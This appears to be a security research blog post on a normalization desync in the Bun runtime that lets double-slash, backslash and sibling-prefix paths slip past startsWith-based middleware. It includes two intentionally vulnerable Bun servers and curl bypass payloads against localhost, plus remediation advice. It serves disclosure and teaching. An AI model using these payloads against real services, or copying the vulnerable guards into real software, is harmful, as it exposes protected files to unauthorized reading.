---
layout: post
title: "Slacker Slash: Bypassing Bun Security Middleware via Normalization Desync"
author: Mohamed Salem Eddah
date: 2026-03-13
tags: [bun, path-traversal, middleware-bypass, javascript]
profile_picture: /assets/images/ze3ter.jpg
handle: ze3ter
social_links: ["https://x.com/ze3ter_"]
description: "How WHATWG URL compliance in Bun creates a normalization desync with POSIX utilities, enabling double-slash and partial-path middleware bypasses."
permalink: /research/bun-slacker-slash
---

Modern JavaScript runtimes like Bun advertise strict WHATWG URL compliance, but this creates a silent security blind spot when it collides with POSIX-normalizing filesystem utilities. Bun's URL parser preserves multiple leading slashes (e.g., `//admin/secret.txt`), while `path.join()` collapses them per POSIX convention (`//admin` → `/admin`). This "Normalization Differential" allows attackers to bypass string-based middleware; a check like `startsWith("/admin")` returns `false` for `//admin`, yet the filesystem sink resolves it successfully. This desync also extends to backslash-based evasion, as Bun's parser automatically converts `\` to `/` per spec, masking the traversal from middleware while the sink reads the file.

Beyond the parser desync, a secondary "Partial Path Collision" exists in common validation logic. Because `startsWith` is a string-based operation rather than a segment-aware path operation, an attacker can move "sideways" into sibling directories that share a naming prefix with the intended root. While Bun's URL parser sanitizes `..` segments in the primary path, raw inputs handled via query parameters or custom headers remain vulnerable. A request for `../public_backup/` resolved via `path.normalize()` will satisfy a security check for `/public` because the string "public_backup" starts with "public." To remediate, developers must terminate the root path with a separator or use segment-aware validation like `path.relative()`.

---

### PoC 1 — Bun Normalization Desync (Slacker Slash)

```typescript
import { serve } from "bun";
import { join } from "node:path";

await Bun.write("admin_secret.txt", "FLAG{BUN_ARCHITECTURAL_DESYNC}");

serve({
  port: 3000,
  async fetch(req) {
    const path = new URL(req.url).pathname;

    // Guard: literal check — misses '//admin_secret.txt'
    if (path.startsWith("/admin_secret.txt")) {
      return new Response("Forbidden", { status: 403 });
    }

    try {
      const resolvedPath = join(process.cwd(), path);
      return new Response(await Bun.file(resolvedPath).text());
    } catch {
      return new Response("Not Found", { status: 404 });
    }
  },
});
```

### PoC 2 — Partial Path Collision (Query Parameter)

```typescript
import { serve } from "bun";
import { join, normalize } from "node:path";

const ROOT = join(process.cwd(), "public");

serve({
  port: 3001,
  async fetch(req) {
    const url = new URL(req.url);
    const userInput = url.searchParams.get("file") || "";

    const normalized = normalize(join(ROOT, userInput));

    // VULNERABLE: Matches "public_backup" because it starts with "public"
    if (!normalized.startsWith(ROOT)) {
      return new Response("Forbidden", { status: 403 });
    }

    try {
      return new Response(await Bun.file(normalized).text());
    } catch {
      return new Response("Not Found", { status: 404 });
    }
  },
});
```

### Test Commands

```bash
# Run PoC 1 (server.ts) for tests 1 and 2
# 1. Double-slash bypass (Slacker Slash)
curl "http://localhost:3000//admin_secret.txt"

# 2. Backslash bypass (Bun converts \ to / per spec)
curl "http://localhost:3000/\admin_secret.txt"

# Run PoC 2 (server2.ts) for test 3
# 3. Partial Path Collision (Sibling directory escape via query param)
curl "http://localhost:3001/?file=../public_backup/config.txt"
```
